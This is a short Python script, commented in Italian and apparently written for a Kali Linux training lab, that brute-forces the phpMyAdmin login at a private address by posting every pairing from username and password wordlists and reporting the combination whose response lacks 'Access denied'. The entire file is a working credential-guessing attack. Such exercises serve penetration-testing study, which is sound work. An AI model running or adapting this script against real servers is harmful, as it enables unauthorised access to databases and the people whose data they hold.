import requests

# Dichiarazione delle variabili contenenti il percorso del file con liste username e password
username_file = '/home/kali/Desktop/brute/usernames.txt'
password_file = '/home/kali/Desktop/brute/password.txt'
# Variabile per conteggiare i tentativi
numerotentativi = 0
# L'istruzione with è usata per aprire i due file in sola lettura
with open(username_file, 'r') as usernames:
    with open(password_file, 'r') as passwords:
        # Leggi tutti gli usernames e le passwords in due liste separate
        username_list = usernames.readlines()
        password_list = passwords.readlines()
        # Ciclo for concatenato per provare ogni possibile combinazione delle credenziali
        for username in username_list:
            for password in password_list:
                username = username.strip()
                password = password.strip()
		# URL di destinazione per la richiesta POST
                url = 'http://192.168.50.101/phpMyAdmin/'
                response = requests.post(url, data={'pma_username': username, 'pma_password': password, 'input_go': "Go"})

                numerotentativi = numerotentativi + 1
		# Controllo sullo stato della risposta, se uguale a 200 effettua il controllo per verificare se la stringa
		# "access denied" è contenuta all'interno del testo di risposta
                if response.status_code == 200:
                	# Se la stringa è presente allora le credenziali sono errate, altrimenti sono corrette
                    if 'Access denied' in response.text:
                        print('Accesso errato -->', username, '-', password)
                    else:
                        print('Accesso riuscito -->', username, '-', password)
                        print('Accesso effettuato in', numerotentativi, 'tentativi')
                        exit()
                else:
                    print('Errore nella richiesta:', response.status_code)
